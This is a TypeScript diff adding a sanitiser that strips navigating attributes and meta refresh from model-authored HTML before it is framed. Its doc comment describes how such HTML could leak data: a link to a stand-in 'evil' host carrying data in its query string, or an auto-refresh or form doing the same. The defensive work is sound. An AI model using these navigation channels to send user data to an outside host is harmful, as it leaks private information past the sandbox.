@@ -43,6 +43,84 @@ const FRAME_CSP = [
 ].join('; ');
 
 /**
+ * The one thing neither the sandbox nor the policy stops: a click.
+ *
+ * `sandbox=""` withholds `allow-top-navigation` and `allow-popups`, so the
+ * fragment cannot navigate the app or open a window. It says nothing about the
+ * frame navigating ITSELF, which is what a plain `<a href="https://evil/?d=…">`
+ * does on click, with the default `_self` target. CSP has nothing to say about
+ * it either: `navigate-to` was removed from the spec and never shipped, and
+ * `default-src 'none'` governs fetches rather than navigations. So one click on
+ * text the model chose was a GET to an origin the model chose, carrying
+ * whatever it put in the query string — on web and on mobile, where the frame
+ * is a real browsing context.
+ *
+ * `<meta http-equiv="refresh">` is the same channel without the click, and
+ * `<form action>`/`formaction` is the same channel with a button on it.
+ *
+ * The rewrite is an ALLOWLIST over attribute values, not a scheme denylist:
+ * anything that is not a same-document fragment survives as a `data-` copy the
+ * reader can still see, and nothing else keeps its navigating attribute. It
+ * runs on a parsed tree rather than over the string, because attribute
+ * matching by regex is exactly the kind of thing a model gets to iterate
+ * against.
+ */
+export function neutraliseNavigation(html: string): string {
+  if (typeof DOMParser === 'undefined') {
+    // Nothing here can parse, so nothing here can be trusted to have been
+    // neutralised. Show the fragment as text rather than as a document.
+    return escapeHtml(html);
+  }
+
+  const NAVIGATES = [
+    'href',
+    'xlink:href',
+    'action',
+    'formaction',
+    'ping',
+    'target',
+    'download',
+    'srcset',
+    'src',
+    'data',
+    'poster',
+    'background',
+  ];
+
+  const parsed = new DOMParser().parseFromString(html, 'text/html');
+
+  for (const element of Array.from(parsed.querySelectorAll('base, meta[http-equiv]'))) {
+    element.remove();
+  }
+
+  for (const element of Array.from(parsed.querySelectorAll('*'))) {
+    for (const attribute of NAVIGATES) {
+      const value = element.getAttribute(attribute);
+      if (value === null) continue;
+      if (attribute === 'href' && value.startsWith('#')) continue;
+      if ((attribute === 'src' || attribute === 'poster') && value.startsWith('data:')) continue;
+      element.removeAttribute(attribute);
+      // Kept visible rather than deleted: the user can read where the model
+      // wanted to send them, and can decide for themselves.
+      element.setAttribute(`data-withheld-${attribute.replace(':', '-')}`, value);
+    }
+  }
+
+  // Head as well as body: a bare `<style>` in the fragment is hoisted into
+  // `<head>` by the parser, and returning only the body would silently discard
+  // the model's CSS — a "safe" render_html that no longer renders anything.
+  return parsed.head.innerHTML + parsed.body.innerHTML;
+}
+
+function escapeHtml(text: string): string {
+  return text.replace(
+    /[&<>"']/g,
+    (character) =>
+      ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[character] ?? character,
+  );
+}
+
+/**
  * Wrap model-authored HTML in a document that cannot reach the network.
  *
  * The policy goes first, before any of the model's bytes. A `<meta>` CSP
@@ -51,7 +129,7 @@ const FRAME_CSP = [
  * multiple policies intersect, they do not override.
  */
 export function frameDocument(html: string): string {
-  return `<!doctype html><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="${FRAME_CSP}">${html}`;
+  return `<!doctype html><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="${FRAME_CSP}">${neutraliseNavigation(html)}`;
 }
 
 /** Exported so a test can assert the policy rather than restate it. */
